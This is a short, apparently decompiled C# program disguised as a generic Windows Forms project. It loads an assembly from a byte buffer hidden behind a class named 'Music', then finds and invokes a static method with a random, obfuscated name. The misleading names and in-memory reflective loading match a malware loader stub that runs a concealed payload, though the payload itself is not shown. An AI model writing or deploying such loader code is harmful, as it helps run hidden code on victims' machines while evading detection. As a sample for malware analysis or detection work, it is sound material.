using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace WindowsFormsApp52;

internal class Program
{
	private static void Main()
	{
		GetList3();
	}

	private static List<Type> GetList1()
	{
		List<Type> list = new List<Type>();
		list.AddRange(Assembly.Load(Music.GetBuffer()).GetTypes().ToArray());
		return list;
	}

	private static List<MethodInfo> GetList2()
	{
		List<MethodInfo> list = new List<MethodInfo>();
		Type[] array = GetList1().ToArray();
		foreach (Type type in array)
		{
			list.AddRange(type.GetMethods());
		}
		return list;
	}

	private static void GetList3()
	{
		MethodInfo method = GetList2().FirstOrDefault((MethodInfo m) => m.IsStatic && m.Name == "Hewyhuwfqyaxhuqzulqswlhd");
		((Action)Delegate.CreateDelegate(typeof(Action), method))();
	}
}
